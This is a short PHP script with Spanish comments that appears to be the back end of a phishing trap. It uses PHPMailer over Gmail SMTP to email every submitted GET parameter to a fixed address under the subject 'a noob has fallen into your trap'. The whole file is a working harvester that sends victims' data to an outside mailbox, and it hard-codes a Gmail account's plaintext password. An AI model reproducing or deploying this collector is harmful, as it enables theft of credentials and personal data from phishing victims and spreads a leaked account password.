<?php
require_once('class.phpmailer.php'); //Incluimos la clase phpmailer

//$fp = fopen('datos.txt','a') or die("Problemas al crear");

//foreach($_GET as $clave => $valor)
//{
//fwrite($fp,"\n".$clave." => ".$valor."\n");
//}
//fclose($fp);

$mail = new PHPMailer(true); // Declaramos un nuevo correo, el parametro true significa que mostrara excepciones y errores.

$mail->IsSMTP(); // Se especifica a la clase que se utilizará SMTP

//------------------------------------------------------
  $correo_emisor="jortizpinturaspinturil@gmail.com";     //Correo a utilizar para autenticarse
  $nombre_emisor="pinturil";               //Nombre de quien envía el correo
  $contrasena="hasacell";          //contraseña de tu cuenta en Gmail
  $correo_destino="2jota27@gmail.com";      //Correo de quien recibe
  $nombre_destino="2Jotas";                //Nombre de quien recibe   	
//--------------------------------------------------------
  $mail->SMTPDebug  = 2;                     // Habilita información SMTP (opcional para pruebas)
                                             // 1 = errores y mensajes
                                             // 2 = solo mensajes
  $mail->SMTPAuth   = true;                  // Habilita la autenticación SMTP
  $mail->SMTPSecure = "ssl";                 // Establece el tipo de seguridad SMTP
  $mail->Host       = "smtp.gmail.com";      // Establece Gmail como el servidor SMTP
  $mail->Port       = 465;                   // Establece el puerto del servidor SMTP de Gmail
  $mail->Username   = $correo_emisor;  	     // Usuario Gmail
  $mail->Password   = $contrasena;           // Contraseña Gmail
  //A que dirección se puede responder el correo
  $mail->AddReplyTo($correo_emisor, $nombre_emisor);
  //La direccion a donde mandamos el correo
  $mail->AddAddress($correo_destino, $nombre_destino);
  //De parte de quien es el correo
  $mail->SetFrom($correo_emisor, $nombre_emisor);
  //Asunto del correo
  $mail->Subject = 'Ha caido un noob en tu trampa';
  //Mensaje alternativo en caso que el destinatario no pueda abrir correos HTML
  //$mail->AltBody = 'Hijole para ver el mensaje necesita un cliente de correo compatible con HTML.';
  //El cuerpo del mensaje, puede ser con etiquetas HTML

  //Archivos adjuntos
  //$mail->AddAttachment('img/logo.jpg');      // Archivos Adjuntos
  
try{
  //Enviamos el correo
	foreach($_GET as $clave => $valor)
	{
		if(isset($clave))
		{
			$mail->MsgHTML($valor);
			$mail->Send();
			//$fp = fopen('datos.txt','a') or die("Problemas al crear");
			//fwrite($fp,"\n".$valor."\n");
			//fclose($fp);
		}
	
} 
  
} catch (phpmailerException $e) {
  	echo $e->errorMessage();
  	} //Errores de PhpMailer} 
  catch (Exception $e) {
  	echo $e->getMessage(); 
  	}//Errores de cualquier otra cosa.}

?>
